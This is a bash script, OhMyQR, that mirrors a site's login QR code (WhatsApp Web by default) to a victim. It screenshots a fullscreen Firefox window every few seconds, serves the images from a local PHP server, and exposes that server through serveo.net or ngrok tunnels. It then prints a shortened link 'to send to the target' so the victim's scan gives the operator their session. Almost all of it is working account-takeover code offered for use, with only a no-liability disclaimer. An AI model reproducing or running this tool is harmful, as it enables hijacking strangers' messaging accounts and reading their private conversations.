#!/bin/bash
# OhMyQR v1.0
# Coded by: thelinuxchoice (You dont become a coder by just changing the credits)
# Github: https://github.com/thelinuxchoice/ohmyqr

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
command -v scrot > /dev/null 2>&1 || { echo >&2 "I require scrot but it's not installed. Install it. Aborting."; exit 1; }
command -v xdotool > /dev/null 2>&1 || { echo >&2 "I require xdotool but it's not installed. Install it. Aborting."; exit 1; }

}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

if [[ -e tmp.jpg ]]; then
rm -rf tmp.jpg
fi

}

scrot_screen() {


firefox $website &
sleep 40
xdotool key "F11"
sleep 5
while [ true ]; do
sleep 5
scrot -u tmp.jpg
done

}

banner() {
printf "\n"
printf "\e[1;77m .d88888b.  888      888b     d888           .d88888b.  8888888b.   \n"
printf 'd88P\" \"Y88b 888      8888b   d8888          d88P\" \"Y88b 888   Y88b  \n'
printf "888     888 888      88888b.d88888          888     888 888    888  \n"
printf "888     888 88888b.  888Y88888P888 888  888 888     888 888   d88P  \n"
printf '888     888 888 \"88b 888 Y888P 888 888  888 888     888 8888888P\"   \n'
printf "888     888 888  888 888  Y8P  888 888  888 888 Y8b 888 888 T88b    \n"
printf 'Y88b. .d88P 888  888 888   \"   888 Y88b 888 Y88b.Y8b88P 888  T88b   \n'
printf ' \"Y88888P\"  888  888 888       888  \"Y88888  \"Y888888\"  888   T88b  \n'
printf "                                        888        Y8b              \n"
printf "                                   Y8b d88P                         \n"
printf '                                    \"Y88P\" v1.0                     \e[0m\n'

printf "\n"
printf "\e[1;93m  ::: Author: @thelinuxchoice\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by OhMyQR     ::\e[0m\n"
printf "\n"
}


website() {

default_website="https://web.whatsapp.com"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Website to mirror QR (default: Whatsapp): \e[0m\en' website
website="${website:-${default_website}}"

}


serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Memorize this link to send to the target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
printf "\e[1;77m[!] Now, we will open Firefox in fullscreen mode. Send the link to target after that.\e[0m"
read -p $'\e[1;77m Ok?\e[0m' -n 1 -r
printf "\e[1;77m[!] After you get session, close this script with Ctrl + C, \e[0m"
read -p $'\e[1;77mOk?\e[0m' -n 1 -r
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Firefox...\e[0m\n'
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Use F11 to exit fullscreen mode\e[0m\n'
scrot_screen

}



start() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Memorize this link to send to the target:\e[0m\e[1;77m %s\e[0m\n" $link
printf "\n"
printf "\e[1;77m[!] Now, we will open Firefox in fullscreen mode. Send the link to target after that.\e[0m"
read -p $'\e[1;77m Ok?\e[0m' -n 1 -r
printf "\e[1;77m[!] After you get session, close this script with Ctrl + C, \e[0m"
read -p $'\e[1;77mOk?\e[0m' -n 1 -r
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Firefox...\e[0m\n'
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Use F11 to exit fullscreen mode\e[0m\n'
scrot_screen
}

start1() {
if [[ -e tmp.jpg ]]; then
rm -rf tmp.jpg
fi
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
website
serverx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
website
start
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}

banner
dependencies
start1

